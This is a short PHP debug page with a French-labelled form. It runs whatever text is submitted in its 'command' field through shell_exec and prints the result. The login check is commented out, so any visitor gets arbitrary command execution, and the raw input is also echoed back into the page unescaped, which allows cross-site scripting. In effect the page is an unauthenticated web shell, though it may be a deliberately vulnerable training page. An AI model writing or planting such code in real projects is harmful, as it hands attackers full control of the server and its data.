<?php 
// session_start();
// if (!isset($_SESSION['user'])) {
//     header("Location: index.php");
//     die();
// }
?>

<?php include __DIR__ . '/templates/header.php'; ?>

<br>
<form name="ping" action="debug.php" method="POST">
    <p>
        Commande à lancer :
        <input type="text" name="command" size="50" value="<?= isset($_POST['command']) ? $_POST['command'] : "entrez une commande ..." ?>">
        <input type="submit" name="Submit" value="Lancer">
    </p>
</form>

<?php if (isset($_POST['command'])) {

    $cmd = shell_exec( $_POST['command'] );
    echo "<br><pre>{$cmd}</pre>";

} ?>
